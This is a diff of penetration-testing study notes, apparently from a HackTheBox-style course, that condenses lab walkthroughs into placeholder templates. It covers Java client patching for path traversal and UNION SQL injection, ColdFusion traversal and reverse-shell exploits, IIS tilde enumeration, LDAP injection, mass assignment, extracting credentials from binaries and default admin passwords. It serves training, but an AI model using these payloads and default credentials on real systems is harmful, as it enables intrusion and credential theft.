-Main-Class: htb.fatty.client.run.Starter
-```
-
-Rebuild and run — login with qtc/clarabibi now succeeds:
-
-```powershell
-cd .\fatty-client
-jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
-```
-
-Whoami shows role `user`; ServerStatus options are unclickable → a higher-priv role exists. FileBrowser → Notes reveals `security.txt` (unfixed critical issues) and `dave.txt` (all admin users removed from the DB; login timeout added against time-based SQLi).
 
 ### Path Traversal
 
-FileBrowser reads files, but `../../../../../../etc/passwd` fails — the server filters out `/`. Decompile with **JD-GUI** (Save All Sources). `htb/fatty/client/gui/ClientGuiTest.java` hardcodes the folder passed to `showFiles()`:
+If the server filters the `/` character from a file-browsing parameter, decompile the client (JD-GUI, Save All Sources) to find the method sending the folder parameter and the GUI code that hardcodes it, then patch the hardcoded value to `..` (no slash needed) to traverse up.
 
-```java
-ClientGuiTest.this.currentFolder = "configs";
-try {
-  response = ClientGuiTest.this.invoker.showFiles("configs");
-```
-
-Change both to `".."` — no slashes, so the filter is bypassed. Recompile and rebuild:
-
-```powershell
-javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
+```bash
+javac -cp <JAR> <PATH_TO_GUI_JAVA_FILE>
 mkdir raw
-cp fatty-client-new.jar raw\fatty-client-new-2.jar
-# extract fatty-client-new-2.jar in raw\, then overwrite the gui classes
-mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
-cd raw
-jar -cmf META-INF\MANIFEST.MF traverse.jar .
+cp <JAR> raw\<JAR>-2.jar
+jar -cmf META-INF\MANIFEST.MF <OUTPUT_FILE>.jar .
 ```
 
-FileBrowser → Config now lists `configs/../` — including `fatty-server.jar` and `start.sh` (which runs the server inside an Alpine Docker container).
+Overwrite the extracted copy's recompiled `.class` files with the patched ones before the final `jar` build above.
 
-To exfiltrate a file, patch `open()` in `htb/fatty/client/methods/Invoker.java` to write the response to disk:
-
-```java
-import java.io.FileOutputStream;
-<SNIP>
-public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
-    <SNIP>
-    this.action = new ActionMessage(this.sessionID, "open");
-    this.action.addArgument(foldername);
-    this.action.addArgument(filename);
-    sendAndRecv();
-    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
-    FileOutputStream fos = new FileOutputStream(desktopPath);
-
-    if (this.response.hasError()) {
-        return "Error: Your action caused an error on the application server!";
-    }
-
-    byte[] content = this.response.getContent();
-    fos.write(content);
-    fos.close();
-
-    return "Successfully saved the file to " + desktopPath;
-}
-```
-
-Rebuild the JAR the same way, log in, FileBrowser → Config, type `fatty-server.jar`, click Open — it lands on the Desktop.
+To exfiltrate a traversed file, patch the client's file-open handler to write the server's response bytes to a local file via `FileOutputStream`.
 
 ### SQL Injection
 
-Decompiling `fatty-server.jar`, `htb/fatty/server/database/FattyDbSession.class` → `checkLogin()`:
+Client-side password hashing (`sha256(username+password+<SECRET>)`) doesn't stop injection in the username field if the server builds the query by string concatenation. A trailing `'` in the username can trigger a SQL syntax error, logged server-side (readable via the path traversal above) to confirm the injection point.
 
-```java
-rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
-```
-
-Username goes in unsanitized. But the client hashes the password first (`htb/fatty/shared/resources/user.java`):
-
-```java
-public void setPassword(String password) {
-    String hashString = this.username + password + "clarabibimakeseverythingsecure";
-    // SHA-256 of hashString, hex-encoded
-}
-```
-
-So the DB hash must equal `sha256(username+password+"clarabibimakeseverythingsecure")` — a plain `' or '1'='1` returns the first record, then fails the hash comparison. SQL errors are logged to a file readable via `showFiles("../logs")` (error-log.txt) — logging in with `qtc'` confirms the injection via the syntax error.
-
-UNION injection creates a fake row where you control the password and role. First patch `User.java` to send the password as plaintext:
-
-```java
-public void setPassword(String password) {
-    this.password = password;
-}
-```
-
-Rebuild, then log in with username:
-
-```
-abc' UNION SELECT 1,'abc','a@b.com','abc','admin
-```
-
-and password `abc`. The server runs:
+`' or '1'='1` style payloads fail here because the returned row's password hash won't match the client-computed hash, but a `UNION SELECT` can fabricate an entire row, including password and role, so the attacker controls what gets hashed/compared.
 
 ```sql
-select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
+<ANY>' UNION SELECT 1,'<USER>','<EMAIL>','<PASSWORD>','admin
 ```
 
-First SELECT fails, the UNION row returns the fake admin with password `abc` — comparison passes, and you're in as **admin** with ServerStatus unlocked.
+If the client hashes the password before sending, patch the client's password-setter to send the plaintext password instead, so it matches the UNION-injected plaintext value server-side, yielding an authenticated login with an arbitrary role (e.g. `admin`).
 
 ## ColdFusion - Discovery & Enumeration
 
-Java-based platform, CFML tag language. Historical issues include CVE-2021-21087 (JSP source upload), CVE-2020-24453 (AD integration misconfiguration), CVE-2020-24450 (command injection), CVE-2020-24449 (arbitrary file read), CVE-2019-15909 (XSS).
+Java-based web app platform by Adobe, using the CFML tag-based language (`.cfm`/`.cfc` files, tags like `cfquery`, `cfloop`, `cfdirectory`, `cfexecute`).
 
-Default ports: 80/443 HTTP(S), **8500** (the install port to check), 5500 (server monitor), 1935 RPC, 25 SMTP.
+`CVE-2013-0632` RCE | `CVE-2013-0629` directory traversal + file disclosure | `CVE-2010-2861` directory traversal + arbitrary file read | `CVE-2018-15961` arbitrary file upload leading to RCE | `CVE-2023-26360` pre-auth RCE
+
+`80` HTTP | `443` HTTPS | `1935` RPC | `25` SMTP | `8500` SSL | `5500` Server Monitor, remote admin
 
 ### Enumeration
 
-- `.cfm` / `.cfc` file extensions anywhere → ColdFusion
-- Headers like `Server: ColdFusion` / `X-Powered-By: ColdFusion`
-- Error messages referencing CF-specific tags/functions
-- Default files: `admin.cfm`, `CFIDE/administrator/index.cfm`
+Indicators: `.cfm`/`.cfc` extensions, `Server: ColdFusion` or `X-Powered-By: ColdFusion` headers, ColdFusion-specific error messages, default files (`CFIDE/administrator/index.cfm`).
 
 ```bash
 nmap -p- -sC -Pn <TARGET_IP> --open
-# 8500/tcp open fmtp
 ```
 
-Browsing `http://<TARGET_IP>:8500` lists the `CFIDE` and `cfdocs` directories, plus `.cfm` files and error pages. `/CFIDE/administrator` loads the Administrator login page — the module target showed **ColdFusion 8**. (The VM can take up to 90s to respond.)
+`/CFIDE/administrator` loads the ColdFusion Administrator login page, which can reveal the major version.
 
 ## Attacking ColdFusion
 
-### Searchsploit
+Searchsploit-driven exploitation of a fingerprinted ColdFusion version for file read or RCE.
 
 ```bash
 searchsploit adobe coldfusion
-searchsploit -p 14641    # prints the local exploit path to copy
+searchsploit -p <EDB_ID> # show exploit path, copies to clipboard
+cp /usr/share/exploitdb/exploits/<PATH> .
 ```
-
-For ColdFusion 8, the two of interest: Adobe ColdFusion - Directory Traversal (14641.py) and Adobe ColdFusion 8 - Remote Command Execution (50057.py).
 
 ### Directory Traversal
 
-**CVE-2010-2861** (ColdFusion 9.0.1 and earlier) — read arbitrary files via the `locale` parameter in:
+CVE-2010-2861 affects ColdFusion ≤9.0.1 via the `locale` parameter in several `.cfm` files, no auth required to read arbitrary files:
 
-```
-CFIDE/administrator/settings/mappings.cfm
-logging/settings.cfm
-datasources/index.cfm
-j2eepackaging/editarchive.cfm
-CFIDE/administrator/enter.cfm
-```
+`CFIDE/administrator/settings/mappings.cfm`, `logging/settings.cfm`, `datasources/index.cfm`, `j2eepackaging/editarchive.cfm`, `CFIDE/administrator/enter.cfm`
 
-Concept: `mappings.cfm?locale=en` becomes `mappings.cfm?locale=../../../../../etc/passwd`.
+```http
+http://<TARGET_DOMAIN>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
+```
 
 ```bash
-python2 14641.py <TARGET_IP> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+python2 14641.py <TARGET_IP> <PORT> "<TRAVERSAL_PATH>/lib/password.properties"
 ```
 
-`[cf_root]/lib/password.properties` stores encrypted passwords for DB connections, mail servers, LDAP — retrieved output example:
-
-```
-rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP
-password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
-encrypted=true
-```
+`password.properties` (in `[cf_root]/lib`) stores encrypted service credentials (DB, mail, LDAP).
 
 ### Unauthenticated RCE
 
-**CVE-2009-2265** (ColdFusion 8.0.1 and earlier) — file upload via the bundled FCKeditor:
+CVE-2009-2265: Adobe ColdFusion ≤8.0.1, FCKeditor file upload with no auth.
 
-```
-http://<TARGET_IP>:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
+```http
+http://<TARGET_DOMAIN>/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
 ```
 
-EDB 50057 uploads a JSP payload and triggers the reverse shell. Edit the script's config first:
+Exploit script needs `lhost`, `lport`, `rhost`, `rport` set before running.
 
 ```python
-if __name__ == '__main__':
-    # Define some information
-    lhost = '<ATTACKER_IP>'
-    lport = 4444
-    rhost = "<TARGET_IP>"
-    rport = 8500
-    filename = uuid.uuid4().hex
+lhost = '<ATTACKER_IP>'
+lport = <PORT>
+rhost = "<TARGET_IP>"
+rport = <PORT>
 ```
 
 ```bash
-python3 50057.py    # generates + uploads the JSP payload, connects back via Ncat
+python3 50057.py
 ```
 
 ## IIS Tilde Enumeration
 
-IIS generates 8.3 short names for files/folders; `~` + sequence number in a URL reaches them even when the long name is hidden. Probe character by character — `200 OK` means the short name continues with that character (`/~s` → `/~se` → `/~sec` → ... → `secret~1`). Then access files directly: `secret~1/somefi~1.txt`. The `~1`/`~2` suffix distinguishes similar names (`somefi~1.txt` vs `somefi~2.txt`).
-
-### Enumeration
+Exploits IIS's 8.3 short-name generation to enumerate hidden files/directories via the `~` character in a URL (e.g. `/~s`, `/~se`, `/~sec` narrows to `secret~1`).
 
 ```bash
 nmap -p- -sV -sC --open <TARGET_IP>
-# 80/tcp open http Microsoft IIS httpd 7.5
 ```
 
-Automated with IIS-ShortName-Scanner (needs Oracle Java; hit enter for "no" at the proxy prompt):
+### Tilde Enumeration using IIS ShortName Scanner
+
+Requires Oracle Java installed.
 
 ```bash
 java -jar iis_shortname_scanner.jar 0 5 http://<TARGET_IP>/
 ```
 
-Module example result: directories `ASPNET~1`, `UPLOAD~1`; files `CSASPX~1.CS`, `CSASPX~1.CS??`, `TRANSF~1.ASP`. GET on `TRANSF~1.ASP` was blocked → brute-force the full filename. Build a wordlist from the stock wordlists filtered on the short-name prefix:
+### Generate Wordlist
+
+Build a targeted wordlist from a known short-name prefix to brute force the full filename.
 
 ```bash
-egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+egrep -r ^<PREFIX> /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
 ```
+
+### Gobuster Enumeration
 
 ```bash
 gobuster dir -u http://<TARGET_IP>/ -w /tmp/list.txt -x .aspx,.asp
-# /transf**.aspx (Status: 200)
 ```
 
 ## LDAP
 
+Protocol for accessing/managing directory services, not itself a directory service (AD is one implementation using LDAP). Default port 389 (LDAP) or 636 (LDAPS). No encryption by default, needs LDAPS or StartTLS.
+
 ### ldapsearch
 
+Command-line utility to query an LDAP directory.
+
 ```bash
-ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+ldapsearch -H ldap://<TARGET_DOMAIN>:389 -D "cn=<USERNAME>,dc=<DOMAIN>,dc=com" -w <PASSWORD> -b "ou=people,dc=<DOMAIN>,dc=com" "(mail=<EMAIL>)"
 ```
 
-Binds as the admin DN, searches under the base DN with the mail filter.
+`-H` server URI | `-D` bind DN | `-w` bind password | `-b` search base DN
 
 ### LDAP Injection
 
-Web apps authenticating against LDAP can be bypassed by injecting wildcards/operators into login fields: `*` (any characters), `()` grouping, `|` OR, `&` AND; `(cn=*)` / `(objectClass=*)` as always-true conditions. Typical query shape:
+Malicious users manipulate LDAP queries via special characters to bypass authentication or access unauthorized data: `*` any chars, `( )` group expressions, `|` logical OR, `&` logical AND, `(cn=*)` always-true condition.
 
-```
+```php
 (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
 ```
 
-- `$username = *` → matches any account with the supplied password
-- `$password = *` → matches the supplied user with any password
+Injecting `*` into either the username or password field can bypass authentication entirely.
 
 ### Enumeration
 
 ```bash
 nmap -p- -sC -sV --open --min-rate=1000 <TARGET_IP>
-# 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) — title: Login
-# 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
 ```
 
-OpenLDAP on 389 + a login page on 80 → assume the app authenticates over LDAP. Module example: `*` in both the username and password fields → logged in, auth bypassed.
+An OpenLDAP service alongside a web login page suggests the web app authenticates via LDAP.
+
+### Injection
+
+Logging in with `*` as both username and password bypasses authentication on an LDAP-backed login form.
 
 ## Web Mass Assignment Vulnerabilities
 
-Frameworks that bind user-entered parameters straight into objects/models let attackers set attributes never meant to be user-controlled. Rails example — only username and email are mass-assignable:
+Frameworks that auto-bind form/POST data to model objects can let an attacker set fields never shown in the form (e.g. `admin`, `confirmed`) if the backend doesn't whitelist allowed fields.
 
-```ruby
-class User < ActiveRecord::Base
-  attr_accessible :username, :email
-end
+Ruby on Rails example, only `username`/`email` are intended to be settable, but an attacker can still add `admin` since Rails binds whatever is present in the POST body:
+
+```javascript
+{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
 ```
-
-Yet POSTing `"user" => { "username" => "hacker", "email" => "...", "admin" => true }` still sets `admin` if the backend doesn't whitelist.
 
 ### Exploiting Mass Assignment Vulnerability
 
-Asset Manager web app (source available): registration succeeds, but login returns "Account is pending approval". From `/opt/asset-manager/app.py`:
+If a registration flow checks a backend `confirmed`/approval flag, adding an unexpected `confirmed` parameter to the POST body (any value, via Burp) can flip it to true and bypass admin approval.
 
-```python
-for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
-  if k:
-    session['user']=i
-    return redirect("/home",code=302)
-  else:
-    return render_template('login.html',value='Account is pending for approval')
+```text
+username=<USERNAME>&password=<PASSWORD>&confirmed=<ANY_VALUE>
 ```
 
-```python
-try:
-  if request.form['confirmed']:
-    cond=True
-except:
-      cond=False
-```
+### Prevention
 
-The `confirmed` parameter is read from the request but never appears in the registration form. Intercept the POST to `/register` in Burp and append it:
+Rails strong parameters, explicitly whitelist permitted fields.
 
+```ruby
+def user_params
+  params.require(:user).permit(:username, :email)
+end
 ```
-username=new&password=test&confirmed=test
-```
-
-Register → log in as `new:test` immediately, no admin approval required.
 
 ## Attacking Applications Connecting to Services
 
-Apps that connect to databases/services carry connection strings — extract the credentials, connect directly, or spray the password across the network's users.
+Local binaries that connect to backend services (DBs, APIs) may have connection strings/credentials hardcoded or recoverable via debugging.
 
 ### ELF Executable Examination
 
-`octopus_checker` — found on a remote host, runs and attempts a SQL connection (the unixODBC driver error in its output is the tell that a connection string is inside). Load it in GDB with PEDA:
+GDB + PEDA to find a hardcoded SQL connection string passed to `SQLDriverConnect`.
 
 ```bash
-gdb ./octopus_checker
-```
-
-```
+gdb ./<BINARY>
 set disassembly-flavor intel
-disas main
+disas main          # locate the call to SQLDriverConnect
+b *<ADDRESS>         # address of the SQLDriverConnect call
+run                  # connection string appears in a register (e.g. RDX) at the breakpoint
 ```
 
-Strings referenced around the calls are scrambled pieces of a SQL connection string (out of order, reversed due to endianness). Further down, a call to `SQLDriverConnect@plt`. Break on it and run:
-
-```
-b *0x5555555551b0
-run
-```
-
-RDX points at the assembled string:
-
-```
-DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;
-```
-
-Try the creds against MSSQL, then check password reuse for other users on the network.
+Credentials recovered this way are also worth testing for reuse against other services/users on the network.
 
 ### DLL File Examination
 
-`MultimasterAPI.dll` — a .NET assembly. Quick peek:
+.NET DLLs can be inspected for connection strings/credentials.
 
 ```powershell
-Get-FileMetaData .\MultimasterAPI.dll
+Get-FileMetaData .\<FILE>.dll
 ```
 
-Open it in **dnSpy** (reads/edits/debugs .NET source directly): `MultimasterAPI.Controllers → ColleagueController` contains the database connection string with its password. Beyond connecting to MSSQL, spray that password against other services.
+`dnSpy` opens, decompiles, and debugs .NET assemblies (C#/VB) to read source directly (e.g. a controller class holding a DB connection string with a password).
 
 ## Other Notable Applications
 
+Applies the same discovery/enumeration/abuse mindset to any unfamiliar application, default credentials and built-in functionality are often enough.
+
 ### Honorable Mentions
 
-- **Axis2** — often sits on top of Tomcat. If Tomcat RCE fails, try weak/default admin creds on Axis2 → upload an AAR webshell (Axis2 service file). A Metasploit module assists.
-- **Websphere** — many vulns over the years; default creds `system:manager` on the admin console → WAR deploy → RCE, same as Tomcat.
-- **Elasticsearch** — forgotten installs with assorted vulns (seen buried in a 100s-of-pages EyeWitness report). HTB: Haystack.
-- **Zabbix** — SQLi, auth bypass, stored XSS, LDAP password disclosure, RCE; built-in functionality abusable for RCE via the API. HTB: Zipper.
-- **Nagios** — RCE, root privesc, SQLi, code injection, stored XSS. Default creds `nagiosadmin:PASSW0RD`; fingerprint the version.
-- **WebLogic** — Java EE app server, 190+ CVEs, many unauthenticated RCEs from 2007–2021, largely Java deserialization.
-- **Wikis/Intranets** (MediaWiki, SharePoint, custom portals) — check known vulns and document repositories; intranet search functions have led straight to valid credentials.
-- **DotNetNuke (DNN)** — .NET CMS: auth bypass, directory traversal, stored XSS, file upload bypass, arbitrary file download.
-- **vCenter** — large orgs run it to manage ESXi. Check weak creds and vuls scanners miss (Apache Struts 2 RCE; unauthenticated OVA file upload, CVE-2021-22005). Windows appliance → JuicyPotato privesc; has been seen running as SYSTEM or even domain admin — a single source of compromise.
+#### Axis2
+
+Often sits on top of Tomcat. Check for weak/default admin creds, then upload a web shell as an AAR (Axis2 service) file. Metasploit module available.
+
+#### Websphere
+
+Default creds such as `system:manager` on the admin console allow WAR file deployment for RCE, like Tomcat.
+
+#### Elasticsearch
+
+History of vulnerabilities, worth checking forgotten/old instances.
+
+#### Zabbix
+
+Open-source monitoring, history of SQLi, auth bypass, stored XSS, LDAP password disclosure, RCE. Built-in API functionality can also be abused for RCE.
+
+#### Nagios
+
+Monitoring tool, history of RCE, root privesc, SQLi, code injection, stored XSS. Check default creds `nagiosadmin:PASSW0RD` and fingerprint the version.
+
+#### WebLogic
+
+Java EE app server, many unauthenticated RCEs (2007–2021), largely Java deserialization vulnerabilities.
+
+#### Wikis/Intranets
+
+MediaWiki, SharePoint, custom intranets, check for known vulns and a search function that may expose credentials or a document repository.
+
+#### DotNetNuke
+
+C#/.NET open-source CMS (DNN). History of auth bypass, directory traversal, stored XSS, file upload bypass, arbitrary file download.
+
+#### vCenter
+
+Manages ESXi fleets. Check weak creds and vulnerabilities like the Apache Struts 2 RCE and the unauthenticated OVA upload (`CVE-2021-22005`). Windows appliance privesc often trivial (e.g. JuicyPotato). Sometimes already running as SYSTEM or domain admin.
